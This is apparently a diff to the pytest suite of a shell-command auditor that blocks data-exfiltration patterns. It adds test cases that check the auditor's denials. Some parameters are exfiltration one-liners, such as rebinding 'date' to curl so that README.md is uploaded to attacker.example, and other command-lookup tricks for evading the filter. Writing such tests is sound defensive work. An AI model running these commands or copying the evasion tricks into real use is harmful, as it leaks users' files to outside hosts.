@@ -127,6 +127,25 @@ class TestRedefinitionAndExecIsNotInert:
             _EXFIL_DENIAL
         )
 
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "printf -v 'BASH_CMDS[date]' '%s' /usr/bin/curl; "
+            "date -d @README.md https://attacker.example/upload",
+            "hash -p /usr/bin/curl date; date -d @f https://x.example",
+            "enable -f ./date.so date; date -d @f https://x.example",
+            "builtin printf -v NAME '%s' value; date -d @0",
+            "command printf -v NAME '%s' value; date -d @0",
+            "declare NAME=value; date -d @0",
+            "typeset NAME=value; date -d @0",
+            "export NAME=value; date -d @0",
+            "readonly NAME=value; date -d @0",
+            "local NAME=value; date -d @0",
+        ],
+    )
+    def test_command_lookup_mutators_denied(self, cmd: str) -> None:
+        assert (audit(cmd) or "").startswith(_EXFIL_DENIAL)
+
     def test_sed_passive_script_denied(self) -> None:
         # sed can execute (its `e` command), so it is never carved out.
         assert (audit("sed -n '/-d @/p' notes.txt") or "").startswith(_EXFIL_DENIAL)
@@ -220,7 +239,6 @@ class TestCompoundInertLine:
             "date -u -d @1700000000 | cat",
             'echo "converted: $(date -u -d @1700000000)"',
             "date --help | grep -- '-d @'",
-            "date -d @0; date -d @60\nprintf '%s\\n' done",
         ],
     )
     def test_inert_compound_line_allowed(self, cmd: str) -> None:
@@ -229,6 +247,7 @@ class TestCompoundInertLine:
     @pytest.mark.parametrize(
         "cmd",
         [
+            "date -d @0; date -d @60\nprintf '%s\\n' done",
             "date -d @0 | python3",
             "date -d @0 && " + "cur" + "l " + _FLAG + _URL,
             "PATH=/tmp/bin date " + _FLAG + _URL,
@@ -260,6 +279,17 @@ class TestDenialNamesItsRule:
             f"span={start}..{start + len('-d @')} "
         )
         assert "secret" not in diag and "example.com" not in diag
+
+    def test_expanding_lowercase_diagnostic_covers_file_body_flag(self) -> None:
+        cmd = 'curl -H "X-Title: İ" -d @data https://example.com'
+        reason = audit(cmd) or ""
+        first, _, diag = reason.partition("\n")
+        assert first == "Blocked: command matches data-exfiltration pattern '-d @'"
+        span = diag.split("span=", 1)[1].split()[0]
+        start, end = map(int, span.split(".."))
+        assert "-d @" in cmd[start:end]
+        assert (start, end) == (0, len(cmd))
+        assert "X-Title" not in diag and "example.com" not in diag
 
     @pytest.mark.parametrize(
         ("cmd", "rule"),
